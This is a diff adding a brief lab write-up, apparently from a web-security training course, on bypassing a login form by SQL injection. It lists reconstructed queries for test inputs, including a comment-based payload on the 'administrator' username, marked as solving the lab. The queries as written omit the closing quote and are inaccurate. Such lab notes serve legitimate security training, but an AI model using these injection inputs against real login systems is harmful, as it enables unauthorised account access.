@@ -1,0 +1,14 @@
+Lab #2: SQL injection vulnerability allowing login bypass 
+
+    Target Goal:
+         Log in as the administrator user 
+
+    Analysis:
+         
+         SELECT firstname FROM users WHERE username='admin' AND password='admin' 
+         
+         SELECT firstname FROM users WHERE username=''' AND password='admin' (internal server error) 
+
+         SELECT firstname FROM users WHERE username='admin--' AND password='admin' ( Invalid username or password)
+
+         SELECT firstname FROM users WHERE username='administrator--' AND password='admin' (Lab solved)
